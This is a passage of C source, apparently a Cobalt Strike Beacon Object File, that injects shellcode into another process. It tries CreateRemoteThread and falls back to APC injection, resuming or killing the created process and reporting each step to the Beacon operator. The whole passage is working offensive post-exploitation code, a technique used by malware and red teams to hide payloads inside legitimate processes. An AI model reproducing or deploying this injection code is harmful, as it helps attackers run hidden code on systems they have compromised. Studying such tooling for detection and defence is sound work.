    BeaconPrintf(CALLBACK_OUTPUT, "Wrote %d bytes to target process", written);

    // Determine injection method
    BeaconPrintf(CALLBACK_OUTPUT, "Attempting injection via CreateRemoteThread");

    dwResult = inject_via_remotethread(hProcess, dwDestinationArch, lpRemoteShellcode, NULL);

    if (dwResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "CreateRemoteThread failed, attempting APC injection");

        dwResult = inject_via_apcthread(hProcess, dwPid, dwDestinationArch, lpRemoteShellcode, NULL);

        if (dwResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "All injection methods failed");
            KERNEL32$VirtualFreeEx(hProcess, lpRemoteShellcode, 0, MEM_RELEASE);
            if (bCreatedProcess) {
                KERNEL32$TerminateProcess(hProcess, 1);
                KERNEL32$CloseHandle(pi.hThread);
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "APC injection succeeded");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "CreateRemoteThread injection succeeded");
    }

    // Resume the main thread if we created the process
    if (bCreatedProcess && dwResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Resuming main thread of created process");
        KERNEL32$ResumeThread(pi.hThread);
        KERNEL32$CloseHandle(pi.hThread);
    } else if (bCreatedProcess) {
        // Clean up on failure
        KERNEL32$TerminateProcess(hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
    }

    KERNEL32$CloseHandle(hProcess);

    if (dwResult == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Cross-architecture injection completed successfully");
    }
}
